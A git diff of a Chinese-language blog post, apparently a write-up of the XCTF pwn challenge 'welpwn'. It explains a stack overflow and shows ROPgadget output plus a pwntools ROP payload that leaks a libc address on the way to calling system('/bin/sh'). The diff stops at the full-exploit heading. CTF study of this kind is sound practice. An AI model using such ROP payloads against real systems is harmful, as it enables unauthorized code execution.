@@ -20,17 +20,17 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"ccomoss.github.io","root":"/hack-tech/","images":"/hack-tech/images","scheme":"Gemini","darkmode":true,"version":"8.17.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/hack-tech/js/config.js"></script>
 
-    <meta name="description" content="程序分析 程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到00就停止复制 这里就会导致栈溢出 漏洞利用 checksec可以发现，程序除了NX没有开启任何保护，这样的栈溢出漏洞似乎很好利用，只要泄露出libc，然后调用system(&quot;&#x2F;bin&#x2F;sh&quot;)就行，，但实际上利用却没那么直接">
+    <meta name="description" content="程序分析 程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到\x00就停止复制 这里就会导致栈溢出 漏洞利用 checksec可以发现，程序除了NX没有开启任何保护，这样的栈溢出漏洞似乎很好利用，只要泄露出libc，然后调用system(&quot;&#x2F;bin&#x2F;sh&quot;)就行，，但实际上利用却没那么直接">
 <meta property="og:type" content="article">
 <meta property="og:title" content="攻防世界-Pwn-GFSJ0181-welpwn">
 <meta property="og:url" content="https://ccomoss.github.io/hack-tech/2023/07/31/pwn-GFSJ0181/index.html">
 <meta property="og:site_name" content="COSMOS">
-<meta property="og:description" content="程序分析 程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到00就停止复制 这里就会导致栈溢出 漏洞利用 checksec可以发现，程序除了NX没有开启任何保护，这样的栈溢出漏洞似乎很好利用，只要泄露出libc，然后调用system(&quot;&#x2F;bin&#x2F;sh&quot;)就行，，但实际上利用却没那么直接">
+<meta property="og:description" content="程序分析 程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到\x00就停止复制 这里就会导致栈溢出 漏洞利用 checksec可以发现，程序除了NX没有开启任何保护，这样的栈溢出漏洞似乎很好利用，只要泄露出libc，然后调用system(&quot;&#x2F;bin&#x2F;sh&quot;)就行，，但实际上利用却没那么直接">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://ccomoss.github.io/hack-tech/2023/07/31/pwn-GFSJ0181/1.png">
 <meta property="og:image" content="https://ccomoss.github.io/hack-tech/2023/07/31/pwn-GFSJ0181/2.png">
 <meta property="article:published_time" content="2023-07-31T15:34:29.000Z">
-<meta property="article:modified_time" content="2023-07-31T15:38:49.348Z">
+<meta property="article:modified_time" content="2023-08-01T14:44:54.537Z">
 <meta property="article:author" content="qinglong-huang">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
@@ -197,9 +197,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2023-07-31 23:34:29 / 修改时间：23:38:49" itemprop="dateCreated datePublished" datetime="2023-07-31T23:34:29+08:00">2023-07-31</time>
+      <time title="创建时间：2023-07-31 23:34:29" itemprop="dateCreated datePublished" datetime="2023-07-31T23:34:29+08:00">2023-07-31</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2023-08-01 22:44:54" itemprop="dateModified" datetime="2023-08-01T22:44:54+08:00">2023-08-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -221,17 +227,17 @@
     
     
     <div class="post-body" itemprop="articleBody"><h2 id="程序分析">程序分析</h2>
-<p>程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到00就停止复制</p>
+<p>程序逻辑似乎很简单：最大接受0x400个字节，然后从头开始复制到s[16]里面，遇到\x00就停止复制</p>
 <p>这里就会导致栈溢出</p>
 <h2 id="漏洞利用">漏洞利用</h2>
 <p>checksec可以发现，程序除了NX没有开启任何保护，这样的栈溢出漏洞似乎很好利用，只要泄露出libc，然后调用system("/bin/sh")就行，，但实际上利用却没那么直接</p>
 <span id="more"></span>
 <p>首先，按照一般逻辑，泄露puts函数地址的payload如下： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br></pre></td></tr></table></figure></p>
-<p>但其实这样操作，会出现截断，因为p64()包装的pop_rdi_ret的值必定存在
-<img src="1.png" /></p>
+<p>但其实这样操作，会出现截断，因为p64()包装的pop_rdi_ret的值必定存在\x00</p>
+<p><img src="1.png" /></p>
 <p>可以看到，此时的栈结构是这个样子</p>
 <p><img src="2.png" /></p>
-<p>因为payload的后面都是地址，经过p64()包装之后必定含有，所以就必须保证payload的前0x18个字节没有。而在echo的返回地址之后是紧邻我们0x400的输入的，所以完全可以利用四个pop，把0x400输入的前0x20个字节出栈，从而继续执行下面的payload</p>
+<p>因为payload的后面都是地址，经过p64()包装之后必定含有\x00，所以就必须保证payload的前0x18个字节没有\x00。而在echo的返回地址之后是紧邻我们0x400的输入的，所以完全可以利用四个pop，把0x400输入的前0x20个字节出栈，从而继续执行下面的payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary=welpwn --only=<span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040089c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004008a2 : pop r15 ; ret</span><br><span class="line">0x000000000040089b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040089f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400675 : pop rbp ; ret</span><br><span class="line">0x00000000004008a3 : pop rdi ; ret</span><br><span class="line">0x00000000004008a1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040089d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400589 : ret</span><br><span class="line">0x00000000004006a5 : ret 0xc148</span><br><span class="line">0x000000000040081a : ret 0xfffd</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 13</span><br></pre></td></tr></table></figure>
 <p>可以直接使用第一个 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x4008a3</span></span><br><span class="line">pop_4_ret = <span class="number">0x40089c</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(pop_4_ret) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recv(<span class="number">0x18</span>+<span class="number">3</span>)   <span class="comment"># 这里会把pop_4_ret的地址也打印出来</span></span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(p.recv()[:-<span class="number">1</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;puts_addr = &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure></p>
 <h2 id="完整exp">完整EXP</h2>
